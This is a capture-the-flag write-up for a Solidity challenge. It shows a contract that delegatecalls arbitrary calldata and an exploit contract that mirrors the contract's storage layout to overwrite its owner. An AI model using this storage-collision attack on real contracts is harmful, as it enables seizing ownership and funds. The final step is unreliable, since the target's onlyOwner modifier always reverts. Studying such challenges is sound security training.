# d31eg4t3

## Challenge

We receive one contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract D31eg4t3{
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    modifier onlyOwner{
        require(false, "Not a Owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function hackMe(bytes calldata bites) public returns(bool, bytes memory) {
        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
        return (r, msge);
    }


    function hacked() public onlyOwner{
        canYouHackMe[msg.sender] = true;
    }
}
```

## Solution

The issue we have here is the handling of storage during a delegate call. The hackMe() function delegates whatever calldata we have back to us. As delegatecall uses the callers storage in the functions of the callee, we can just write a function in our contract that overwrites owner with our address. If we copy the storage layout of the target, this is super easy. I just wrote a simple exploit contract for this:

```
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "./Target.sol";

contract attack {
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    D31eg4t3 target_contract;

    constructor(address target_addr)
    {
        target_contract = D31eg4t3(target_addr);
    }

    function attack_fun() public 
    {
        target_contract.hackMe(abi.encodeWithSelector(this.overwrite.selector));
    }

    function overwrite() public
    {
        owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
    }
}
```

after this you can just directly call the hacked function.